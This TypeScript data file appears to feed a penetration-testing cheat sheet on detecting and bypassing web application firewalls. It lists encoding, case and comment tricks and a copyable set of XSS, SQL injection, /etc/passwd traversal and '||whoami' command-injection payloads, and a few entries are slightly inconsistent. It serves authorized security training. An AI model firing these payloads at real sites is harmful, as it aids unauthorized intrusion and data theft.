export interface WAFStep {
  id: string
  title: string
  description: string
  commands: { command: string; description: string }[]
  tools?: { name: string; url: string; description: string }[]
  tips?: string[]
}

export const wafSteps: WAFStep[] = [
  {
    id: "note",
    title: "Important Note",
    description:
      "This document is for authorized security testing and CTF use only. Do not use on systems you do not have permission to test.",
    commands: [],
    tips: [
      "Always obtain proper authorization before testing",
      "Use on systems you have explicit permission to test",
      "Keep detailed logs of all testing activities",
    ],
  },
  {
    id: "introduction",
    title: "What is a WAF?",
    description:
      "A Web Application Firewall (WAF) sits in front of web applications and filters incoming traffic to block malicious requests.",
    commands: [],
    tips: [
      "WAFs use signature-based and behavioral detection",
      "Some WAFs: Cloudflare, AWS WAF, ModSecurity, Akamai, F5",
      "Bypass techniques vary by WAF vendor",
    ],
  },
  {
    id: "detection",
    title: "Detecting WAF",
    description:
      "First step is to identify if a WAF is present and which one.",
    commands: [
      {
        command: "curl -I https://target.com",
        description: "Check headers for WAF signatures",
      },
      {
        command: "wafw00f -a https://target.com",
        description: "Use wafw00f tool",
      },
      {
        command: "whatwaf -u https://target.com",
        description: "Use whatwaf tool",
      },
    ],
    tools: [
      {
        name: "wafw00f",
        url: "https://github.com/EnableSecurity/wafw00f",
        description: "WAF detection tool",
      },
    ],
    tips: [
      "Look for headers: Server, X-Powered-By, CF-Ray",
      "Check for set-cookie patterns",
      "Test with blocked keywords like '<script>'",
    ],
  },
  {
    id: "http-methods",
    title: "1) HTTP Method Bypass",
    description:
      "Try different HTTP methods to bypass WAF filtering.",
    commands: [
      {
        command: "GET /payLoad -> OPTIONS /payLoad",
        description: "OPTIONS method bypass",
      },
      {
        command: "GET /test -> HEAD /test",
        description: "HEAD method bypass",
      },
      {
        command: "GET /search?q=x -> GET /search?q=x+.json",
        description: "Extension appending",
      },
    ],
    tips: [
      "WAFs may not filter all HTTP methods equally",
      "Try methods: GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH",
    ],
  },
  {
    id: "header-manipulation",
    title: "2) Header Manipulation",
    description:
      "Modify HTTP headers to bypass WAF rules.",
    commands: [
      {
        command: "curl -H 'X-Forwarded-IP: 127.0.0.1' https://target.com",
        description: "X-Forwarded-For spoofing",
      },
      {
        command: "curl -H 'X-Real-IP: 127.0.0.1' https://target.com",
        description: "X-Real-IP header",
      },
    ],
    tips: [
      "X-Forwarded-For is commonly trusted",
      "Some WAFs trust specific headers blindly",
    ],
  },
  {
    id: "encoding-bypass",
    title: "3) Encoding & Obfuscation",
    description:
      "Use various encoding techniques to bypass WAF detection.",
    commands: [
      {
        command: "URL: <script> -> %3cscript%3e",
        description: "URL encoding",
      },
      {
        command: "Double URL: <script> -> %253cscript%253e",
        description: "Double URL encoding",
      },
      {
        command: "Null byte: <%00script>",
        description: "Null byte injection",
      },
    ],
    tips: [
      "WAF may not decode properly",
      "Test all encoding variations",
    ],
  },
  {
    id: "case-variations",
    title: "4) Case Sensitivity Bypass",
    description:
      "Change case to bypass case-sensitive WAF rules.",
    commands: [
      {
        command: "<SCRIPT>alert(1)</SCRIPT>",
        description: "Uppercase bypass",
      },
      {
        command: "<ScRiPt>alert(1)</ScRiPt>",
        description: "Mixed case bypass",
      },
    ],
    tips: [
      "Some WAFs use case-sensitive matching",
      "Test common keywords in various cases",
    ],
  },
  {
    id: "whitespace",
    title: "5) Whitespace Variations",
    description:
      "Use alternative whitespace characters.",
    commands: [
      {
        command: "SELECT/**/FROM users",
        description: "Comment whitespace",
      },
      {
        command: "SELECT+FROM users",
        description: "Plus sign instead of space",
      },
    ],
    tips: [
      "WAFs may not handle all whitespace variations",
    ],
  },
  {
    id: "comment-injection",
    title: "6) Comment Injection",
    description:
      "Inject comments to break WAF signatures.",
    commands: [
      {
        command: "UN/**/ION SEL/**/ECT",
        description: "Inline comments in SQL",
      },
    ],
    tips: [
      "Comments break signature matching",
    ],
  },
  {
    id: "common-payloads",
    title: "Common WAF Bypass Payloads",
    description:
      "Copy these commonly used WAF bypass payloads.",
    commands: [
      {
        command: "<script>alert(1)</script>",
        description: "Basic XSS",
      },
      {
        command: "' OR '1'='1",
        description: "Basic SQLi",
      },
      {
        command: "UNION ALL SELECT NULL,NULL,NULL--",
        description: "SQLi UNION",
      },
      {
        command: "../../../etc/passwd",
        description: "Directory traversal",
      },
      {
        command: "||whoami",
        description: "Command injection",
      },
    ],
    tips: [
      "Encode appropriately for target",
      "Test each with bypass techniques",
    ],
  },
  {
    id: "tools",
    title: "Useful Tools",
    description:
      "Tools for WAF detection and bypass.",
    commands: [],
    tools: [
      {
        name: "wafw00f",
        url: "https://github.com/EnableSecurity/wafw00f",
        description: "WAF detection",
      },
      {
        name: "WhatWaf",
        url: "https://github.com/Ekultek/WhatWaf",
        description: "WAF detection and bypass",
      },
    ],
    tips: [
      "Use wafw00f to identify WAF first",
    ],
  },
  {
    id: "methodology",
    title: "Testing Methodology",
    description:
      "Follow this systematic approach for WAF testing.",
    commands: [
      {
        command: "1. Identify WAF: wafw00f, nmap, manual headers",
        description: "Step 1 - Detect WAF",
      },
      {
        command: "2. Gather information: version, rules, protection level",
        description: "Step 2 - Gather info",
      },
      {
        command: "3. Test basic payloads with bypass techniques",
        description: "Step 3 - Test basics",
      },
    ],
    tips: [
      "Always start with detection",
      "Every WAF is different",
    ],
  },
]